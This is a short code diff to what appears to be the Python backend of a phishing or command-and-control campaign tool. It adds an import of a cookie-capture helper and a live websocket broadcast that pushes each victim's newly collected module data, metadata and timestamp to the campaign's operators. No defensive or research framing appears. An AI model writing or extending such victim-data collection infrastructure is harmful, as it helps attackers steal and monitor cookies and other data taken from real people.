@@ -4,6 +4,8 @@ from __future__ import annotations
 
 from utils.cookie_capture import filter_new_cookie_payload
 
+from core.operator_ws import operator_ws_manager
+
 from .campaign_common import (
     APIRouter,
     Campaign,
@@ -588,6 +590,31 @@ async def add_victim_data(
     db.refresh(data_collection)
 
     logger.info(f"💾 Saved {data_collection.data_type} for victim {victim_id}: {data_collection.file_path}")
+
+    if data_collection.data_type == "module_data":
+        try:
+            module = data_collection.module
+            await operator_ws_manager.broadcast(
+                campaign_id,
+                {
+                    "type": "module_data",
+                    "victim_id": victim_id,
+                    "module_id": data_collection.module_id,
+                    "module_name": module.name if module else None,
+                    "metadata": data_collection.extra_metadata or {},
+                    "collected_at": (
+                        data_collection.collected_at.isoformat()
+                        if data_collection.collected_at
+                        else None
+                    ),
+                },
+            )
+        except Exception as exc:
+            logger.warning(
+                "⚠️ Operator stream broadcast failed for campaign %s: %s",
+                campaign_id,
+                exc,
+            )
 
     return {"success": True, "id": data_collection.id}
 
